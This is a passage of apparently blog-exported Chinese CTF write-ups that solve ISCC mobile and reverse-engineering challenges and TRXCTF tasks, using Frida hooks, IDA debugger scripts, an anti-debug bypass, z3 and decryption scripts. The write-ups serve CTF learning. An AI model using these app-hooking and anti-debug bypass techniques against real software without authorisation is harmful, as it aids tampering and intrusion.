&#x27;&#x27;.join(interleaved)# 十六进制转字符output = []i = 0while i &lt; len(final_hex):    if final_hex[i] == &#x27;0&#x27; and i + 2 &lt; len(final_hex):        output.append(chr(int(final_hex[i+1:i+3], 16)))        i += 3    else:        output.append(chr(int(final_hex[i:i+4], 16)))        i += 4plaintext = &#x27;&#x27;.join(output)print(f&quot;ISCC&#123;&#123;&#123;plaintext&#125;&#125;&#125;&quot;)#ISCC&#123;I_AMSH1K&#125;\n\n\n\nmobile3HolyGrail对耶稣和十二门徒进行排序，顺序在上一题mobile（Detective）的so文件（libSequence-Clues.so）里，顺序如下\n\nJesus,  St. Pete,  St. John,  Judah,  Saint Matthew,  Old Jacob,  St. Thomas,  Saint Simon,  St. Philip,  Bartholomew,  Jacob,  St. Andrew,  Saint Tartary\n\n根据res&#x2F;layout&#x2F;activity_main.xml文件下对应的名称来获取最终的字符串数组\n[&quot;checkBox8&quot;,&quot;checkBox6&quot;,&quot;checkBox7&quot;,&quot;checkBox5&quot;,&quot;checkBox12&quot;,&quot;checkBox3&quot;,&quot;checkBox10&quot;,&quot;checkBox13&quot;, &quot;checkBox11&quot;,&quot;checkBox&quot;,&quot;checkBox9&quot;,&quot;checkBox4&quot;,&quot;checkBox14&quot;]\n\n发现密文由CipherDataHandler.getCipherText(this.userSequence)方法获得。主动调用的到密文”[!PL&#96;Jd0ZWYXbYQ”。\n\n先用密钥对flag进行了维吉尼亚加密，然后闯入native中的processWithNative(String str)；方法。先按十六进制的字符转为数组，然后进行base13编码。最后在b.a()中按2位十六进制转为字符串。\n\n注意到processWithNative(String str)；是一个单字节加密，由于每个字符加密后的长度有可能不同，于是按单字节hook获取字符串表，并直接按照字典格式输出。\n\nhook获取维吉尼亚的静态密钥TheDaVinciCode。\n\n总hook脚本\nJava.perform(function () &#123;    let CipherDataHandler = Java.use(&quot;com.example.holygrail.CipherDataHandler&quot;);    var dec = CipherDataHandler.$new();      var ArrayList = Java.use(&quot;java.util.ArrayList&quot;);    var list = ArrayList.$new();    var box = [&quot;checkBox8&quot;,&quot;checkBox6&quot;,&quot;checkBox7&quot;,&quot;checkBox5&quot;,&quot;checkBox12&quot;,&quot;checkBox3&quot;,&quot;checkBox10&quot;,&quot;checkBox13&quot;, &quot;checkBox11&quot;,&quot;checkBox&quot;,&quot;checkBox9&quot;,&quot;checkBox4&quot;,&quot;checkBox14&quot;]    box.forEach(function (item) &#123;        list.add(item);    &#125;);    var res = dec.getCipherText(list);    console.log(res);let a = Java.use(&quot;com.example.holygrail.a&quot;);a[&quot;vigenereEncrypt&quot;].implementation = function (str, str2) &#123;    console.log(`a.vigenereEncrypt is called: str=$&#123;str&#125;, str2=$&#123;str2&#125;`);    let result = this[&quot;vigenereEncrypt&quot;](str, str2);    console.log(`a.vigenereEncrypt result=$&#123;result&#125;`);    return result;&#125;;  var table =&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\\]^_`&#123;|&#125;~&quot;;  var aa = a.$new();  var dict = &#123;&#125;;  for (var i = 0; i &lt; table.length; i++) &#123;    var res3 = aa.processWithNative(table[i]);    dict[table[i]] = res3;  &#125;  for (var key in dict) &#123;        if (dict.hasOwnProperty(key)) &#123;            console.log( &quot;&#x27;&quot; + dict[key]+&quot;&#x27;&quot;  +&quot;: &quot;  + &quot;&#x27;&quot; + key  +&quot;&#x27;&quot;+&#x27;,&#x27;);        &#125;    &#125;&#125;)\n\n写解密脚本即可\ndict = &#123;&#x27;3921&#x27;: &#x27;0&#x27;,&#x27;3A21&#x27;: &#x27;1&#x27;,&#x27;3B21&#x27;: &#x27;2&#x27;,&#x27;3C21&#x27;: &#x27;3&#x27;,&#x27;4021&#x27;: &#x27;4&#x27;,&#x27;4121&#x27;: &#x27;5&#x27;,&#x27;4221&#x27;: &#x27;6&#x27;,&#x27;4321&#x27;: &#x27;7&#x27;,&#x27;4421&#x27;: &#x27;8&#x27;,&#x27;4521&#x27;: &#x27;9&#x27;,&#x27;46&#x27;: &#x27;a&#x27;,&#x27;47&#x27;: &#x27;b&#x27;,&#x27;48&#x27;: &#x27;c&#x27;,&#x27;49&#x27;: &#x27;d&#x27;,&#x27;4A&#x27;: &#x27;e&#x27;,&#x27;4B&#x27;: &#x27;f&#x27;,&#x27;4C&#x27;: &#x27;g&#x27;,&#x27;50&#x27;: &#x27;h&#x27;,&#x27;51&#x27;: &#x27;i&#x27;,&#x27;52&#x27;: &#x27;j&#x27;,&#x27;53&#x27;: &#x27;k&#x27;,&#x27;54&#x27;: &#x27;l&#x27;,&#x27;55&#x27;: &#x27;m&#x27;,&#x27;56&#x27;: &#x27;n&#x27;,&#x27;57&#x27;: &#x27;o&#x27;,&#x27;58&#x27;: &#x27;p&#x27;,&#x27;59&#x27;: &#x27;q&#x27;,&#x27;5A&#x27;: &#x27;r&#x27;,&#x27;5B&#x27;: &#x27;s&#x27;,&#x27;5C&#x27;: &#x27;t&#x27;,&#x27;60&#x27;: &#x27;u&#x27;,&#x27;61&#x27;: &#x27;v&#x27;,&#x27;62&#x27;: &#x27;w&#x27;,&#x27;63&#x27;: &#x27;x&#x27;,&#x27;64&#x27;: &#x27;y&#x27;,&#x27;65&#x27;: &#x27;z&#x27;,&#x27;5021&#x27;: &#x27;A&#x27;,&#x27;5121&#x27;: &#x27;B&#x27;,&#x27;5221&#x27;: &#x27;C&#x27;,&#x27;5321&#x27;: &#x27;D&#x27;,&#x27;5421&#x27;: &#x27;E&#x27;,&#x27;5521&#x27;: &#x27;F&#x27;,&#x27;5621&#x27;: &#x27;G&#x27;,&#x27;5721&#x27;: &#x27;H&#x27;,&#x27;5821&#x27;: &#x27;I&#x27;,&#x27;5921&#x27;: &#x27;J&#x27;,&#x27;5A21&#x27;: &#x27;K&#x27;,&#x27;5B21&#x27;: &#x27;L&#x27;,&#x27;5C21&#x27;: &#x27;M&#x27;,&#x27;30&#x27;: &#x27;N&#x27;,&#x27;31&#x27;: &#x27;O&#x27;,&#x27;32&#x27;: &#x27;P&#x27;,&#x27;33&#x27;: &#x27;Q&#x27;,&#x27;34&#x27;: &#x27;R&#x27;,&#x27;35&#x27;: &#x27;S&#x27;,&#x27;36&#x27;: &#x27;T&#x27;,&#x27;37&#x27;: &#x27;U&#x27;,&#x27;38&#x27;: &#x27;V&#x27;,&#x27;39&#x27;: &#x27;W&#x27;,&#x27;3A&#x27;: &#x27;X&#x27;,&#x27;3B&#x27;: &#x27;Y&#x27;,&#x27;3C&#x27;: &#x27;Z&#x27;,&#x27;2721&#x27;: &#x27;!&#x27;,&#x27;2921&#x27;: &#x27;#&#x27;,&#x27;2A21&#x27;: &#x27;$&#x27;,&#x27;2B21&#x27;: &#x27;%&#x27;,&#x27;2C21&#x27;: &#x27;&amp;&#x27;,&#x27;3021&#x27;: &#x27;\\&#x27;&#x27;,&#x27;3121&#x27;: &#x27;(&#x27;,&#x27;3221&#x27;: &#x27;)&#x27;,&#x27;3321&#x27;: &#x27;*&#x27;,&#x27;3421&#x27;: &#x27;+&#x27;,&#x27;3521&#x27;: &#x27;,&#x27;,&#x27;3621&#x27;: &#x27;-&#x27;,&#x27;3721&#x27;: &#x27;.&#x27;,&#x27;3821&#x27;: &#x27;/&#x27;,&#x27;4621&#x27;: &#x27;:&#x27;,&#x27;4721&#x27;: &#x27;;&#x27;,&#x27;4821&#x27;: &#x27;&lt;&#x27;,&#x27;4921&#x27;: &#x27;=&#x27;,&#x27;4A21&#x27;: &#x27;&gt;&#x27;,&#x27;4B21&#x27;: &#x27;?&#x27;,&#x27;4C21&#x27;: &#x27;@&#x27;,&#x27;40&#x27;: &#x27;[&#x27;,&#x27;41&#x27;: &#x27;\\\\&#x27;,&#x27;42&#x27;: &#x27;]&#x27;,&#x27;43&#x27;: &#x27;^&#x27;,&#x27;44&#x27;: &#x27;_&#x27;,&#x27;45&#x27;: &#x27;`&#x27;,&#x27;66&#x27;: &#x27;&#123;&#x27;,&#x27;67&#x27;: &#x27;|&#x27;,&#x27;68&#x27;: &#x27;&#125;&#x27;,&#x27;69&#x27;: &#x27;~&#x27;,&#125;enc = b&quot;[!PL`Jd0ZWYXbYQ&quot;.hex().upper()print(enc)res = &quot;&quot;i =0 while i &lt; len(enc):   if enc[i+2:i+4] == &#x27;21&#x27;:      res += dict[enc[i:i+4]]      i+=4   else:      res += dict[enc[i:i+2]]      i+=2print(res)#LhgueyNroqpwqi\n\n用密钥进行维吉尼亚解密\n\nISCC&#123;SacredFeminine&#125;\n\n\nFinalre1CrackMenop一下花指令\n\n加密逻辑如下\n\nmm是密文，直接用赛博厨师解密。\n\nre2uglyCpp大概逻辑就是二叉树后序遍历转int类型异或加密。\n\nstd::function&lt;void ()(std::shared_ptr,std::string &amp;)&gt;::operator()( &amp;GxZuWxsXXlsb[abi:cxx11], head2_ro_xorkey,key_and_after);函数比较难看，动调从汇编跟进去就可以看到后序遍历的函数了。（其实是中序遍历，有反调试）。\nget_xorkey()就是用原密钥生成一次密钥，enc函数里还会有个get_key()但是最后就只有一个异或，直接动调拿密钥就行了。\n\n下条件断点获得异或密钥\n\nimport ida_dbgedx = ida_dbg.get_reg_val(&quot;edx&quot;)print(&quot;,&quot;,edx,end=&quot;&quot;)\n\n可以构造一棵相同的线索二叉树，即可拿到字符在中序遍历后的表。动调的时候输入一串字符“abcdefghijklmnopqrstuvwxyzABCDEFGHIJ”，即可得到字符映射表\n\nmain函数上面有个函数有ptrace反调试会把中序遍历函数改为后序遍历，绕过一下。\n\n密文在cmp()函数里面，脚本如下\nimport stringdef decxor(data:list,key:list) -&gt; list:    res =[]    for i,k in zip(data,key):        res.append(i^k)    return resdef to_str(data:list) -&gt; str:    res =b&#x27;&#x27;    for i in data:        a = i.to_bytes(4,byteorder=&quot;little&quot;)        res+=a    return res.decode()def recover(data:str,chartable:list,after_chartable:list) -&gt; str:    res =[]    index = [i for i in range(36)]    for i in range(36):        index[i] = after_chartable.index(chartable[i])        res.append(data[index[i]])    return &quot;&quot;.join(res)enc = [133064547, 2490223663, 2979342693, 4108347074, 1177400706, 206648502, 2095174241, 3887509941, 147376445]key =[1054224987, 3607740183, 3824320024, 2693203857, 21419769, 2086748415, 280400902, 2497569014, 1085455212]a = decxor(enc,key)b = to_str(a)chartable = string.ascii_lowercase+string.ascii_uppercasechartable = chartable[0:36:]print(&quot;table:&quot;,chartable)after_chartable = &quot;FpGhHqIdJrisbtjuevkwaxlyfzmAcBnCgDoE&quot;flag = recover(b,chartable,after_chartable)print(b)print(&#x27;result:&#x27;,flag)#result: ISCC&#123;gQ9ggk0WkzUsWRaTcGtpFlQsrH888d&#125;\n\n\n\nmobile1GGAD首先要输入密钥，在validateKey()方法下调用了native函数validateKey()，里面要求密钥的sha256是”e60bc9dff5c6c5b4b63b8257ae4d55dfe1d8a622ecb531a2a9898c8fe5c1cd15”。\n在apk的res文件夹里有个压缩包，里面有很多后缀为png的txt文件，按大小排序后在png614.png里可找到一个脚本，观察加密脚本发现是lsb隐写，用zsteg尝试res中大小在100KB以上的图片即可找到flag。\n\n找到一串字符”ExpectoPatronum”，计算sha256和上面的值是相同的，这就是密钥。\n继续分析加密流程，flag先传入native中的JNI1()，是一个标准RC4加密。\n\n加密结果转为二进制，然后在JNI2中转为16进制,并对输入的二进制进行了取反(异或0xff)。\n\n结果再传入b.a()中，按照下标的奇偶位置拆分成两部分，第一部分和一个二进制字符串比较，第二部分与一个维吉尼亚解密出来的字符比较。\n先frida主动调用拿到维吉尼亚解密后的字符串E2C6E85E481439。\nJava.perform(function () &#123;    let c = Java.use(&quot;com.example.ggad.c&quot;).$new();    var res = c.decrypt(&quot;I2Z6T85I481439&quot;,&quot;ExpectoPatronum&quot;);    console.log(`c.a result=$&#123;res&#125;`);&#125;)\n\n\n按照逻辑写恢复脚本。\nimport binasciiimport Crypto.Cipher.ARC4 as RC4def bin_to_hex(binary):    res = list(int(binary[i:i+8],2) for i in range(0,len(binary),8))    return &quot;&quot;.join(chr(i) for i in res)def NOT(a:bytes)-&gt;bytes:    res =b&quot;&quot;    for i in a:        res += (i ^ 0xff).to_bytes(1)    return resbinary1 = &quot;0100001100110100010001000011001000110010001101110100001100110001001101010011000001000010001100100100001100110100&quot;a = bin_to_hex(binary1)b = &quot;E2C6E85E481439&quot;res =[0] * len(a)*2# 拼接for i in range(0,len(a)*2):    if i % 2 == 0:        res[i] = a[i//2]    else:        res[i] = b[i//2]dec_data = &quot;&quot;.join(res)dec_data = binascii.unhexlify(dec_data)# 取反dec_data = NOT(dec_data)#RC4解密key = b&quot;ExpectoPatronum&quot;cipher = RC4.new(key)flag = cipher.decrypt(dec_data)print(&quot;ISCC&#123;&quot; + flag.decode() + &quot;&#125;&quot;)\n\n\n\nmobile2叽米是梦的开场白需要先加载一个dex文件，在mobile4.so的decryptSegment函数里。题目调用dex里的checkFlag方法对前半段flag进行了check。\n\n导出dex\n\n发现是一个3DES加密\n\n去Sunday.so里的getkey()寻找到密钥“74KLVll8hUBIt3joOiKfYLCj”。\n\n解3DES即可拿到前半段。\n程序从asset中加载了一个名为enreal的lib文件，然后把后半段flag和lib文件一起传入了example.mobile04.a中的一个native函数checkFlag2，到Monday.so中分析checkFlag2函数。\n在checkFlag2中，并没有对我们输入的flag进行操作 ，而是对传入的lib文件进行了一些异或操作。而且函数在末尾固定返回0，也就是如果这个函数用于校验flag，那么校验永远也不会成功。推测这个实际是lib文件的解密函数。这里ida伪代码有点问题，看汇编可以恢复解密逻辑。\n\n写个脚本解密一下asset中的enreal(X64)。\nf = open(&quot;enreal&quot;, &quot;rb&quot;).read()input = list(f)for i in range(len(input)):    input[i] = (((input[i] &lt;&lt; 2) | (input[i] &gt;&gt; 6)) &amp; 0xff) ^ 0x44    input[i] = ((input[i] &gt;&gt; 3) | (input[i] &lt;&lt; 5)) &amp; 0xffoutputf = open(&quot;decode_enreal&quot;, &quot;wb&quot;)outputf.write(bytes(input))\n\n解密后在里面找到一个real_check()，和前一段差不多，这里也是一个3DES加密。密文：0x298B602DA18468FC；密钥：“9uzGw2TJszopH0NAecGL0sUS”。脚本解密即可得到后半段flag。\n\nfrom Crypto.Cipher import DES3from Crypto.Util.Padding import unpadkey = b&quot;74KLVll8hUBIt3joOiKfYLCj&quot; ciphertext = &quot;&quot;.join(chr(i) for i in [69, 49, 52, 68, 53, 53, 53, 66, 50, 65, 57, 55, 56, 50, 52, 53])ciphertext = bytes.fromhex(ciphertext)cipher = DES3.new(key, DES3.MODE_ECB)flag =&quot;&quot;try:    plaintext = unpad(cipher.decrypt(ciphertext), DES3.block_size)    flag = plaintext.decode()except ValueError as e:    print(e)ciphertext2 = bytes.fromhex(&quot;298B602DA18468FC&quot;)ciphertext2 = ciphertext2[::-1]key2 = b&quot;9uzGw2TJszopH0NAecGL0sUS&quot;cipher2 = DES3.new(key2, DES3.MODE_ECB)plaintext2 = cipher2.decrypt(ciphertext2)flag += plaintext2.decode()print(&quot;ISCC&#123;&quot; + flag +&quot;&#125;&quot;)# ISCC&#123;Zccr1lzQTGEr0d&#125;","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2025TRXCTF Re-Wp+复现","url":"/2025/02/22/TRXctf/","content":"sudo kurl https&#x2F;&#x2F;spacewar游戏的逻辑是在一个25×25的区域内填写数字。\n在play()函数中，首先会对我们的每次输入用isValid()进行检查。\nisValid()，函数首先会初始化一个bool向量的表(存储0，1的数组)，然后获取board中的值判断是不是0。如果不是0那么获取这个值作为下标获取bool向量中的值判断是不是1，如果是1返回0，如果不是1，把值修改为1。继续进行判断。其实就是判断broad中某一特定的位置的元素是否已经存在。它的检查顺序是，先检查行，再检查列，最后分5x5的块进行检查。\n那么逻辑就是检查行，列，块中是否有重复的数字。如果没有返回1，有的话返回0；\ncheckWin()检查了broad中是否有元素为0 ，如果没有0且isValid()检查也正确就赢得游戏。\n很明显这就是一个数独游戏。查看broad的交叉引用就可以看到初始值在__static_initialization_and_destruction_0()中。拿下来用z3解。\n解完后判断哪些值是要我们要输入的，用pwndbg把值输入，程序输出flag就行。\nimport ida_dbgeax = ida_dbg.get_reg_val(&quot;eax&quot;)print(&quot;,&quot;,eax,end=&quot;&quot;)\n\nfrom z3 import *from pwn import *data =[0, 0, 0, 21, 0, 11, 0, 0, 3, 24, 9, 20, 23, 0, 7, 22, 0, 5, 18, 0, 15, 2, 16, 13, 0, 24, 4, 0, 20, 15, 0, 0, 5, 0, 16, 2, 25, 22, 0, 17, 6, 21, 0, 14, 0, 8, 10, 1, 19, 18, 0, 0, 10, 0, 5, 0, 21, 19, 22, 0, 3, 13, 1, 16, 0, 15, 4, 7, 23, 24, 12, 0, 14, 0, 0, 0, 0, 13, 6, 12, 14, 4, 1, 0, 0, 24, 18, 19, 5, 0, 0, 17, 0, 0, 0, 7, 22, 0, 9, 21, 0, 23, 19, 7, 0, 0, 6, 0, 0, 20, 15, 4, 0, 21, 0, 0, 0, 0, 16, 10, 24, 3, 0, 17, 5, 12, 15, 21, 0, 0, 0, 16, 6, 18, 5, 7, 0, 17, 3, 9, 14, 0, 4, 24, 22, 13, 0, 0, 0, 0, 14, 10, 11, 2, 24, 1, 25, 22, 20, 0, 0, 23, 6, 19, 0, 13, 5, 8, 12, 0, 17, 0, 7, 15, 9, 0, 0, 0, 0, 1, 24, 0, 3, 15, 10, 20, 8, 5, 0, 25, 9, 16, 19, 21, 0, 2, 6, 0, 12, 14, 0, 0, 5, 0, 3, 0, 23, 14, 8, 0, 0, 2, 15, 0, 12, 0, 7, 1, 17, 6, 22, 21, 4, 0, 19, 13, 0, 0, 4, 20, 0, 0, 0, 17, 0, 11, 16, 0, 0, 22, 0, 10, 18, 15, 23, 0, 25, 8, 1, 3, 20, 25, 7, 22, 0, 23, 0, 10, 1, 0, 0, 0, 0, 13, 4, 21, 0, 6, 19, 0, 3, 9, 15, 8, 0, 1, 24, 0, 0, 0, 4, 0, 20, 13, 0, 8, 0, 3, 0, 19, 16, 2, 12, 9, 5, 0, 14, 10, 25, 22, 0, 0, 0, 0, 0, 0, 0, 9, 24, 0, 25, 6, 0, 2, 16, 4, 8, 10, 0, 17, 18, 7, 21, 0, 1, 0, 8, 0, 10, 14, 16, 3, 25, 6, 0, 0, 7, 18, 9, 11, 0, 13, 0, 20, 0, 19, 24, 5, 0, 17, 17, 3, 0, 15, 9, 5, 0, 0, 11, 0, 0, 21, 0, 0, 23, 7, 0, 22, 0, 0, 20, 13, 12, 4, 6, 15, 0, 20, 11, 21, 10, 0, 0, 5, 22, 16, 0, 0, 8, 3, 24, 0, 13, 2, 19, 0, 0, 0, 0, 0, 0, 13, 8, 0, 19, 17, 0, 0, 0, 0, 0, 12, 7, 24, 6, 0, 15, 23, 22, 4, 14, 5, 9, 0, 0, 9, 1, 23, 14, 4, 0, 24, 0, 7, 8, 19, 0, 2, 0, 13, 17, 3, 20, 5, 0, 0, 15, 0, 16, 10, 10, 0, 2, 12, 0, 13, 18, 15, 0, 0, 17, 5, 0, 20, 21, 8, 1, 16, 0, 7, 0, 19, 0, 11, 0, 7, 5, 17, 24, 16, 20, 2, 11, 19, 3, 23, 0, 4, 15, 1, 18, 14, 0, 10, 0, 0, 8, 13, 21, 12, 0, 20, 9, 0, 7, 15, 22, 17, 10, 0, 12, 19, 0, 0, 24, 25, 0, 14, 4, 8, 16, 18, 2, 0, 0, 19, 2, 24, 8, 0, 0, 20, 7, 4, 0, 0, 0, 9, 0, 15, 5, 0, 21, 11, 16, 1, 0, 0, 14, 25, 0, 0, 25, 1, 0, 8, 5, 23, 14, 6, 4, 17, 16, 0, 2, 0, 20, 0, 13, 9, 10, 12, 24, 7, 15, 0, 0, 14, 0, 0, 0, 0, 0, 0, 2, 6, 10, 13, 0, 5, 12, 0, 24, 0, 0, 9, 11, 0, 3, 8, 6, 0, 15, 0, 13, 0, 0, 24, 0, 9, 1, 0, 8, 25, 0, 10, 18, 17, 0, 2, 0, 4, 19, 0, 23    ] # ida断点读出的数据table = [[0]*25 for _ in range(25)] # 把获取的表转成二维数组index =0for i in range(25):    for j in range(25):        table[i][j] = data[index]        index += 1# 创建z3求解器s = Solver()var=[[Int(f&#x27;a_&#123;i&#125;_&#123;j&#125;&#x27;) for i in range(25)] for j in range(25)] #创建变量，给每一个位置创建一个变量for i in range(25):    for j in range(25):        if table[i][j] == 0:  #为零            s.add(1 &lt;= var[i][j])  # 限制范围            s.add(var[i][j] &lt;= 25)        else:            s.add(var[i][j] == table[i][j])for i in range(25): s.add(Distinct(var[i])) # 遍历每个行，设置每行数据不能重复for i in range(25): s.add(Distinct([row[i] for row in var])) # 设置列不能重复for i in range(0, 25, 5):    for j in range(0, 25, 5):        s.add(Distinct([var[i + k // 5][j + k % 5] for k in range(25)])) #设置每个5x5的块不能重复# print(s.check())m = s.model()b = [[int(str(m[var[i][j]])) for j in range(25)] for i in range(25)] #创建新列表，把答案提取出来# print(b)context.terminal=[&quot;open-wsl.exe&quot;,&quot;-c&quot;]# 以新wsl窗口运行io = process([&quot;./chall&quot;]) # 用pwntools进行io输入，把结果输入for i in range(25):    for j in range(25):        if table[i][j] == 0: #判断位置是否需要填入            io.sendline(str(i + 1).encode())            io.sendline(str(j + 1).encode())            io.sendline(str(b[i][j]).encode())io.sendline(str(-1).encode())io.interactive()\n\n队里大佬的脚本参考\na = [[0, 0, 0, 21, 0, 11, 0, 0, 3, 24, 9, 20, 23, 0, 7, 22, 0, 5, 18, 0, 15, 2, 16, 13, 0], [24, 4, 0, 20, 15, 0, 0, 5, 0, 16, 2, 25, 22, 0, 17, 6, 21, 0, 14, 0, 8, 10, 1, 19, 18], [0, 0, 10, 0, 5, 0, 21, 19, 22, 0, 3, 13, 1, 16, 0, 15, 4, 7, 23, 24, 12, 0, 14, 0, 0], [0, 0, 13, 6, 12, 14, 4, 1, 0, 0, 24, 18, 19, 5, 0, 0, 17, 0, 0, 0, 7, 22, 0, 9, 21], [0, 23, 19, 7, 0, 0, 6, 0, 0, 20, 15, 4, 0, 21, 0, 0, 0, 0, 16, 10, 24, 3, 0, 17, 5], [12, 15, 21, 0, 0, 0, 16, 6, 18, 5, 7, 0, 17, 3, 9, 14, 0, 4, 24, 22, 13, 0, 0, 0, 0], [14, 10, 11, 2, 24, 1, 25, 22, 20, 0, 0, 23, 6, 19, 0, 13, 5, 8, 12, 0, 17, 0, 7, 15, 9], [0, 0, 0, 0, 1, 24, 0, 3, 15, 10, 20, 8, 5, 0, 25, 9, 16, 19, 21, 0, 2, 6, 0, 12, 14], [0, 0, 5, 0, 3, 0, 23, 14, 8, 0, 0, 2, 15, 0, 12, 0, 7, 1, 17, 6, 22, 21, 4, 0, 19], [13, 0, 0, 4, 20, 0, 0, 0, 17, 0, 11, 16, 0, 0, 22, 0, 10, 18, 15, 23, 0, 25, 8, 1, 3], [20, 25, 7, 22, 0, 23, 0, 10, 1, 0, 0, 0, 0, 13, 4, 21, 0, 6, 19, 0, 3, 9, 15, 8, 0], [1, 24, 0, 0, 0, 4, 0, 20, 13, 0, 8, 0, 3, 0, 19, 16, 2, 12, 9, 5, 0, 14, 10, 25, 22], [0, 0, 0, 0, 0, 0, 0, 9, 24, 0, 25, 6, 0, 2, 16, 4, 8, 10, 0, 17, 18, 7, 21, 0, 1], [0, 8, 0, 10, 14, 16, 3, 25, 6, 0, 0, 7, 18, 9, 11, 0, 13, 0, 20, 0, 19, 24, 5, 0, 17], [17, 3, 0, 15, 9, 5, 0, 0, 11, 0, 0, 21, 0, 0, 23, 7, 0, 22, 0, 0, 20, 13, 12, 4, 6], [15, 0, 20, 11, 21, 10, 0, 0, 5, 22, 16, 0, 0, 8, 3, 24, 0, 13, 2, 19, 0, 0, 0, 0, 0], [0, 13, 8, 0, 19, 17, 0, 0, 0, 0, 0, 12, 7, 24, 6, 0, 15, 23, 22, 4, 14, 5, 9, 0, 0], [9, 1, 23, 14, 4, 0, 24, 0, 7, 8, 19, 0, 2, 0, 13, 17, 3, 20, 5, 0, 0, 15, 0, 16, 10], [10, 0, 2, 12, 0, 13, 18, 15, 0, 0, 17, 5, 0, 20, 21, 8, 1, 16, 0, 7, 0, 19, 0, 11, 0], [7, 5, 17, 24, 16, 20, 2, 11, 19, 3, 23, 0, 4, 15, 1, 18, 14, 0, 10, 0, 0, 8, 13, 21, 12], [0, 20, 9, 0, 7, 15, 22, 17, 10, 0, 12, 19, 0, 0, 24, 25, 0, 14, 4, 8, 16, 18, 2, 0, 0], [19, 2, 24, 8, 0, 0, 20, 7, 4, 0, 0, 0, 9, 0, 15, 5, 0, 21, 11, 16, 1, 0, 0, 14, 25], [0, 0, 25, 1, 0, 8, 5, 23, 14, 6, 4, 17, 16, 0, 2, 0, 20, 0, 13, 9, 10, 12, 24, 7, 15], [0, 0, 14, 0, 0, 0, 0, 0, 0, 2, 6, 10, 13, 0, 5, 12, 0, 24, 0, 0, 9, 11, 0, 3, 8], [6, 0, 15, 0, 13, 0, 0, 24, 0, 9, 1, 0, 8, 25, 0, 10, 18, 17, 0, 2, 0, 4, 19, 0, 23]]from z3 import *s = Solver()x = [[Int(f&quot;a_&#123;i&#125;_&#123;j&#125;&quot;) for j in range(25)] for i in range(25)]for i in range(25):    for j in range(25):        if a[i][j] == 0:            s.add(1 &lt;= x[i][j])            s.add(x[i][j] &lt;= 25)        else:            s.add(x[i][j] == a[i][j])for i in range(25): s.add(Distinct(x[i]))for i in range(25): s.add(Distinct([row[i] for row in x]))for i in range(0, 25, 5):    for j in range(0, 25, 5):        s.add(Distinct([x[i + k // 5][j + k % 5] for k in range(25)]))print(s.check())m = s.model()b = [[int(str(m[x[i][j]])) for j in range(25)] for i in range(25)]from pwn import *io = process([&quot;./chall&quot;])for i in range(25):    for j in range(25):        if a[i][j] == 0:            io.sendline(str(i + 1).encode())            io.sendline(str(j + 1).encode())            io.sendline(str(b[i][j]).encode())io.sendline(str(-1).encode())io.interactive()# TRX&#123;H0w_0ft3n_d0_y0u_th1nk_4b0ut_th3_R0m4n_3mp1r3?!?:D&#125;\n\n\n\nvm在sub_2589函数内有大概的逻辑，有一些RC4的加密特征。\nfile是我们的code文件设定一个索引 index =0switch(file):每一个case定义了一些关于s[]盒的不同类型的操作方法每次进case会得到一个新的索引 index_tmp = index + 1;switch(index_tmp)，根据index_tmp的值进行不同的对s[]的操作，每一类操作的值是差不多的，只有操作方法不一样我们令file[index_tmp + 1] == f[1];  file[index_tmp + 2] == sf[2];那么大概操作有0 s[f[1] -8 ] op s[f[2] -8]1 s[f[1]] op s[f[2]]2 s[f[1]] op s[s[f[2] - 8]]3 s[s[f[1] -8 ]] op s[f[2]]4 s[s[f[1] -8 ]] op s[s[f[2] -8]]5 s[f[1] -8 ] op f[2]6 s[f[1] -8 ] op s[f[2]]7 s[f[1] -8 ] op s[s[f[2] -8]]8 s[f[1]] op f[2]9 s[s[f[1] -8 ]] op f[2]10 s[f[1]] op s[f[2] -8]11 s[s[f[1] -8 ]] op s[f[2] -8]每次操作完后会把index后移四字节，即每四字节就是一组操作。case 5的操作稍微有些不同0 s[f[1]-8] = ~s[f[2] -8]1 s[f[1]] = ~s[f[2]]4 s[s[f[1]-8]] = ~s[s[f[2] -8]]每次操作完后index向后移动3字节,3字节为一组操作case 8多了一个操作12 s[f[1] -8] ^= s[f[2] + 256]case 11对结果进行验证，index后移一个字节，可能是用来对其数据的。   \n\n动调看大概的逻辑\n我们可以发现，首先执行的就是case 9的case8，也就是8 s[f[1]] &#x3D; f[2]。查看s[]的值可以知道这里初始化了一个256的表。\n然后执行\ncase 0的case5，也就是5 s[f[1] -8 ] +&#x3D; f[2]。\ncase 0 的case0，0 s[f[1] -8 ] +&#x3D; s[f[2] -8]\ncase 9 的case0，s[f[1] -8 ] &#x3D; s[f[2] -8]\ncase9 的case6，6 s[f[1] -8 ] &#x3D; s[f[2]]\ncase9 的case2，2 s[f[1]] &#x3D; s[s[f[2] - 8]]\ncase9 的case11，11 s[s[f[1] -8 ]] &#x3D; s[f[2] -8]\ncase9 的case6，6 s[f[1] -8 ] &#x3D; s[f[2]]\n回到最上面的case 0继续循环\n根据rc4的流程来看上面就是用密钥打乱盒的过程，那么密钥是不会在s盒里的，所以密钥就是f[2]\n后面的流程也是差不多的，如果我们对输入的数据下断点我们就会被定位到异或的位置，在case 8的case 12，也就是\n12 s[f[1] -8] ^&#x3D; s[f[2] + 256]，s[f[2] + 256]\n因为这里加了256所以访问的数据超出了盒的范围从而访问到了我们的输入数据，动调也能看到我们的输入数据就在s[]盒的末尾。\n然后就是case 10的case 5对数据进行比较，也就是\n5 s[f[1] -8 ] &#x3D;&#x3D; f[2]\n再case 11检查结果，然后返回到case0 和case9的一些操作，再到上面的异或，再检比较数据，依次循环。所以f[2]就是密文。\nRC4加密就是一个异或，我们在比较密文和异或的的地方下断点并附加一个python脚本（脚本1）读取寄存器的值。获取到数据后异或解密就行。\n\n\n脚本1\nimport ida_dbgecx = ida_dbg.get_reg_val(&quot;ecx&quot;)print(&quot;,&quot;,ecx,end=&quot;&quot;)# 41, 171, 94, 48, 92, 61, 91, 58, 187, 37, 132, 101, 212, 82, 19, 183, 180, 99, 210, 69, 194, 35, 198, 104, 249, 119, 76, 162, 108, 46import ida_dbgal = ida_dbg.get_reg_val(&quot;al&quot;)print(&quot;,&quot;,al,end=&quot;&quot;)#125, 249, 6, 75, 14, 126, 111, 101, 138, 86, 219, 81, 139, 32, 32, 214, 216, 60, 191, 113, 177, 87, 245, 26, 137, 70, 127, 193, 95, 83\n\n脚本2\nm = [125, 249, 6, 75, 14, 126, 111, 101, 138, 86, 219, 81, 139, 32, 32, 214, 216, 60, 191, 113, 177, 87, 245, 26, 137, 70, 127, 193, 